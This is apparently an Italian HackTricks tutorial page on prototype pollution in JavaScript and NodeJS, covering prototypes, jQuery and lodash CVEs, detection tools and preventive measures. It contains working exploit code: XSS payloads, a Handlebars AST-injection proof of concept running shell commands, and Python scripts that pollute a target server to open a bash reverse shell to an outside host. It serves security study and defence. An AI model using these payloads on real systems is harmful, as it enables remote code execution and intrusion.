# NodeJS - \_\_proto\_\_ e inquinamento del prototipo

{{#include ../../../banners/hacktricks-training.md}}

## Oggetti in JavaScript <a href="#id-053a" id="id-053a"></a>

Gli oggetti in JavaScript sono essenzialmente collezioni di coppie chiave-valore, conosciute come proprietà. Un oggetto può essere creato utilizzando `Object.create` con `null` come argomento per produrre un oggetto vuoto. Questo metodo consente la creazione di un oggetto senza alcuna proprietà ereditata.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)) // This will output an empty object.
```
Un oggetto vuoto è simile a un dizionario vuoto, rappresentato come `{}`.

### Funzioni e Classi in JavaScript

In JavaScript, le classi e le funzioni sono strettamente collegate, con le funzioni che spesso fungono da costruttori per le classi. Nonostante la mancanza di supporto nativo per le classi in JavaScript, i costruttori possono emulare il comportamento delle classi.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name
this.position = position
this.introduce = function () {
return "My name is " + this.name + " and I work as a " + this.position + "."
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer")

employee1.__proto__
```
### Prototipi in JavaScript

JavaScript consente la modifica, l'aggiunta o la cancellazione di attributi del prototipo a runtime. Questa flessibilità consente l'estensione dinamica delle funzionalità delle classi.

Funzioni come `toString` e `valueOf` possono essere modificate per cambiare il loro comportamento, dimostrando la natura adattabile del sistema di prototipi di JavaScript.

## Eredità

Nella programmazione basata su prototipi, le proprietà/metodi sono ereditati dagli oggetti dalle classi. Queste classi vengono create aggiungendo proprietà/metodi a un'istanza di un'altra classe o a un oggetto vuoto.

Va notato che quando una proprietà viene aggiunta a un oggetto che funge da prototipo per altri oggetti (come `myPersonObj`), gli oggetti ereditanti ottengono accesso a questa nuova proprietà. Tuttavia, questa proprietà non viene visualizzata automaticamente a meno che non venga esplicitamente invocata.

## \_\_proto\_\_ inquinamento <a href="#id-0d0a" id="id-0d0a"></a>

## Esplorare l'inquinamento del prototipo in JavaScript

Gli oggetti JavaScript sono definiti da coppie chiave-valore e ereditano dal prototipo dell'oggetto JavaScript. Ciò significa che alterare il prototipo dell'oggetto può influenzare tutti gli oggetti nell'ambiente.

Usiamo un esempio diverso per illustrare:
```javascript
function Vehicle(model) {
this.model = model
}
var car1 = new Vehicle("Tesla Model S")
```
L'accesso al prototipo Object è possibile tramite:
```javascript
car1.__proto__.__proto__
Vehicle.__proto__.__proto__
```
Aggiungendo proprietà al prototipo Object, ogni oggetto JavaScript erediterà queste nuove proprietà:
```javascript
function Vehicle(model) {
this.model = model
}
var car1 = new Vehicle("Tesla Model S")
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function () {
console.log("Beep beep!")
}
car1.announce() // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true
console.log(car1.isVehicle) // Outputs true
```
## inquinamento del prototipo

Per uno scenario in cui l'uso di `__proto__` è limitato, modificare il prototipo di una funzione è un'alternativa:
```javascript
function Vehicle(model) {
this.model = model
}
var car1 = new Vehicle("Tesla Model S")
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function () {
console.log("Beep beep!")
}
car1.beep() // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true
console.log(car1.hasWheels) // Outputs true

// Alternate method
car1.constructor.prototype.honk = function () {
console.log("Honk!")
}
car1.constructor.prototype.isElectric = true
```
Questo influisce solo sugli oggetti creati dal costruttore `Vehicle`, dando loro le proprietà `beep`, `hasWheels`, `honk` e `isElectric`.

Due metodi per influenzare globalmente gli oggetti JavaScript attraverso la contaminazione del prototipo includono:

1. Contaminare direttamente `Object.prototype`:
```javascript
Object.prototype.goodbye = function () {
console.log("Goodbye!")
}
```
2. Inquinare il prototipo di un costruttore per una struttura comunemente usata:
```javascript
var example = { key: "value" }
example.constructor.prototype.greet = function () {
console.log("Hello!")
}
```
Dopo queste operazioni, ogni oggetto JavaScript può eseguire i metodi `goodbye` e `greet`.

## Inquinare altri oggetti

### Da una classe a Object.prototype

In uno scenario in cui puoi **inquinare un oggetto specifico** e hai bisogno di **arrivare a `Object.prototype`**, puoi cercarlo con qualcosa di simile al seguente codice:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for (let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for (let key1 in document.querySelector("a")) {
for (let key2 in document.querySelector("a")[key1]) {
if (document.querySelector("a")[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Inquinamento degli elementi dell'array

Nota che poiché puoi inquinare gli attributi degli oggetti in JS, se hai accesso per inquinare un array puoi anche **inquinare i valori dell'array** accessibili **tramite indici** (nota che non puoi sovrascrivere i valori, quindi devi inquinare indici che sono in qualche modo utilizzati ma non scritti).
```javascript
c = [1, 2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Inquinamento degli elementi Html

Quando si genera un elemento HTML tramite JS, è possibile **sovrascrivere** l'attributo **`innerHTML`** per farlo scrivere **codice HTML arbitrario.** [Idea e esempio da questo writeup](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
## Esempi

### Esempio di base

Una contaminazione del prototipo si verifica a causa di un difetto nell'applicazione che consente di sovrascrivere le proprietà su `Object.prototype`. Ciò significa che poiché la maggior parte degli oggetti deriva le proprie proprietà da `Object.prototype`

L'esempio più semplice è aggiungere un valore a un **attributo indefinito di un oggetto** che verrà controllato, come:
```javascript
if (user.admin) {
```
Se l'attributo **`admin` è indefinito** è possibile abusare di un PP e impostarlo su True con qualcosa come:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Il meccanismo dietro questo coinvolge la manipolazione delle proprietà in modo tale che, se un attaccante ha il controllo su determinati input, può modificare il prototipo di tutti gli oggetti nell'applicazione. Questa manipolazione tipicamente comporta l'impostazione della proprietà `__proto__`, che, in JavaScript, è sinonimo di modifica diretta del prototipo di un oggetto.

Le condizioni sotto le quali questo attacco può essere eseguito con successo, come delineato in uno specifico [studio](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), includono:

- Eseguire una fusione ricorsiva.
- Definire proprietà basate su un percorso.
- Clonare oggetti.

### Funzione di override
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution to RCE

{{#ref}}
prototype-pollution-to-rce.md
{{#endref}}

Altri payload:

- [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Client-side prototype pollution to XSS

{{#ref}}
client-side-prototype-pollution.md
{{#endref}}

### CVE-2019–11358: Attacco di inquinamento del prototipo tramite jQuery $ .extend

[Per ulteriori dettagli controlla questo articolo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) In jQuery, la funzione `$ .extend` può portare a inquinamento del prototipo se la funzionalità di copia profonda viene utilizzata in modo improprio. Questa funzione è comunemente usata per clonare oggetti o unire proprietà da un oggetto predefinito. Tuttavia, quando è configurata in modo errato, le proprietà destinate a un nuovo oggetto possono essere assegnate al prototipo invece. Ad esempio:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode) // Outputs: true
```
Questa vulnerabilità, identificata come CVE-2019–11358, illustra come una copia profonda possa modificare involontariamente il prototipo, portando a potenziali rischi per la sicurezza, come l'accesso non autorizzato da amministratore se proprietà come `isAdmin` vengono controllate senza una corretta verifica di esistenza.

### CVE-2018–3721, CVE-2019–10744: attacco di inquinamento del prototipo tramite lodash

[Per ulteriori dettagli controlla questo articolo](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) ha riscontrato vulnerabilità simili di inquinamento del prototipo (CVE-2018–3721, CVE-2019–10744). Questi problemi sono stati risolti nella versione 4.17.11.

### Un altro tutorial con CVE

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Strumenti per rilevare l'inquinamento del prototipo

- [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): estensione di Burp Suite progettata per rilevare e analizzare vulnerabilità di inquinamento del prototipo lato server nelle applicazioni web. Questo strumento automatizza il processo di scansione delle richieste per identificare potenziali problemi di inquinamento del prototipo. Sfrutta gadget noti - metodi per sfruttare l'inquinamento del prototipo per eseguire azioni dannose - concentrandosi in particolare sulle librerie Node.js.
- [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Questa estensione identifica vulnerabilità di inquinamento del prototipo lato server. Utilizza tecniche descritte nell'[inquinamento del prototipo lato server](https://portswigger.net/research/server-side-prototype-pollution).

### Inquinamento del prototipo AST in NodeJS

NodeJS utilizza ampiamente gli Abstract Syntax Trees (AST) in JavaScript per funzionalità come i motori di template e TypeScript. Questa sezione esplora le vulnerabilità relative all'inquinamento del prototipo nei motori di template, in particolare Handlebars e Pug.

#### Analisi della vulnerabilità di Handlebars

Il motore di template Handlebars è suscettibile a un attacco di inquinamento del prototipo. Questa vulnerabilità deriva da specifiche funzioni all'interno del file `javascript-compiler.js`. La funzione `appendContent`, ad esempio, concatena `pendingContent` se è presente, mentre la funzione `pushSource` reimposta `pendingContent` su `undefined` dopo aver aggiunto la sorgente.

**Processo di sfruttamento**

Lo sfruttamento si basa sull'AST (Abstract Syntax Tree) prodotto da Handlebars, seguendo questi passaggi:

1. **Manipolazione del Parser**: Inizialmente, il parser, tramite il nodo `NumberLiteral`, impone che i valori siano numerici. L'inquinamento del prototipo può eludere questo, consentendo l'inserimento di stringhe non numeriche.
2. **Gestione da parte del Compilatore**: Il compilatore può elaborare un oggetto AST o un template string. Se `input.type` è uguale a `Program`, l'input viene trattato come pre-parsato, il che può essere sfruttato.
3. **Iniezione di Codice**: Attraverso la manipolazione di `Object.prototype`, è possibile iniettare codice arbitrario nella funzione template, il che può portare all'esecuzione remota di codice.

Un esempio che dimostra lo sfruttamento della vulnerabilità di Handlebars:
```javascript
const Handlebars = require("handlebars")

Object.prototype.type = "Program"
Object.prototype.body = [
{
type: "MustacheStatement",
path: 0,
params: [
{
type: "NumberLiteral",
value:
"console.log(process.mainModule.require('child_process').execSync('id').toString())",
},
],
loc: {
start: 0,
end: 0,
},
},
]

const source = `Hello {{ msg }}`
const template = Handlebars.precompile(source)

console.log(eval("(" + template + ")")["main"].toString())
```
Questo codice mostra come un attaccante potrebbe iniettare codice arbitrario in un template Handlebars.

**Riferimento Esterno**: È stato trovato un problema relativo alla contaminazione del prototipo nella libreria 'flat', come dettagliato qui: [Issue on GitHub](https://github.com/hughsk/flat/issues/105).

**Riferimento Esterno**: [Issue related to prototype pollution in the 'flat' library](https://github.com/hughsk/flat/issues/105)

Esempio di exploit di contaminazione del prototipo in Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vulnerabilità di Pug

Pug, un altro motore di template, affronta un rischio simile di inquinamento del prototipo. Informazioni dettagliate sono disponibili nella discussione su [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Esempio di inquinamento del prototipo in Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Misure Preventive

Per ridurre il rischio di inquinamento del prototipo, possono essere impiegate le strategie elencate di seguito:

1. **Immutabilità degli Oggetti**: `Object.prototype` può essere reso immutabile applicando `Object.freeze`.
2. **Validazione degli Input**: Gli input JSON devono essere rigorosamente validati rispetto allo schema dell'applicazione.
3. **Funzioni di Merge Sicure**: L'uso non sicuro di funzioni di merge ricorsive dovrebbe essere evitato.
4. **Oggetti Senza Prototipo**: Gli oggetti senza proprietà di prototipo possono essere creati utilizzando `Object.create(null)`.
5. **Uso di Map**: Invece di `Object`, dovrebbe essere utilizzato `Map` per memorizzare coppie chiave-valore.
6. **Aggiornamenti delle Librerie**: Le patch di sicurezza possono essere incorporate aggiornando regolarmente le librerie.
7. **Strumenti di Linter e Analisi Statica**: Utilizzare strumenti come ESLint con plugin appropriati per rilevare e prevenire vulnerabilità di inquinamento del prototipo.
8. **Revisioni del Codice**: Implementare revisioni del codice approfondite per identificare e risolvere potenziali rischi legati all'inquinamento del prototipo.
9. **Formazione sulla Sicurezza**: Educare gli sviluppatori sui rischi dell'inquinamento del prototipo e sulle migliori pratiche per scrivere codice sicuro.
10. **Uso Cauto delle Librerie**: Essere cauti nell'uso di librerie di terze parti. Valutare la loro postura di sicurezza e rivedere il loro codice, specialmente quelle che manipolano oggetti.
11. **Protezione a Runtime**: Impiegare meccanismi di protezione a runtime come l'uso di pacchetti npm focalizzati sulla sicurezza che possono rilevare e prevenire attacchi di inquinamento del prototipo.

## Riferimenti

- [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
- [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
- [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{{#include ../../../banners/hacktricks-training.md}}
